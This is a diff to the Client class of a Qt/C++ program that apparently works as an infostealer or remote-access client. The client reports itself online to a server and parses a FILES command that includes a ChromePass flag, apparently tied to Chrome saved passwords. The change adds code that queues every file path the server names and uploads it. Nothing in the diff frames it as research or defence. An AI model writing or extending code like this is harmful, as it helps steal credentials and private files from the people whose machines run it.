@@ -101,7 +101,7 @@ void Client::getOnline()
     connect(onlineTimer, &QTimer::timeout, fileClient, &FileClient::connect);
     connect(fileClient, &FileClient::transmitted, onlineTimer, &QTimer::stop);
     //Send string
-    fileClient->enqueueData(_STRING, "ONLINE:" + fileClient->getName());
+    fileClient->enqueueData(_STRING, "ONLINE|" + fileClient->getName());
     fileClient->connect();
 }
 
@@ -117,15 +117,15 @@ void Client::getFile(const QString& path, const QString& /* ip */)
 
 void Client::getString(const QString &string, const QString& /* ip */)
 {
-    QString command = string.section(':', 0, 0);
+    QString command = string.section('|', 0, 0);
     if (command == "FILES")
     {
         QString filesStr = string;
-        //remove "FILES:"
-        int colonPos = string.indexOf(":");
+        //remove "FILES|"
+        int colonPos = string.indexOf("|");
         filesStr.remove(0, colonPos+1);
 
-        QString currentFile = filesStr.section(';', 0, 0);
+        QString currentFile = filesStr.section('|', 0, 0);
         quint16 files = currentFile.toInt();
         if (files & ChromePass & !(isChromePassExists))
         {
@@ -152,13 +152,16 @@ void Client::getString(const QString &string, const QString& /* ip */)
             });
         }
 
-        //Look for all files
-        currentFile = filesStr.section(';', 1, 1);
+        //Look for all files in string
+        currentFile = filesStr.section('|', 1, 1);
         for (int i = 2; ! currentFile.isEmpty(); ++i)
         {
-            qDebug() << currentFile;
-            currentFile = filesStr.section(';', i, i);
+            //TODO
+            //Update check if section is empty file1||file2
+            fileClient->enqueueData(_FILE, currentFile);
+            currentFile = filesStr.section('|', i, i);
         }
+        fileClient->connect();
     }
 }
 
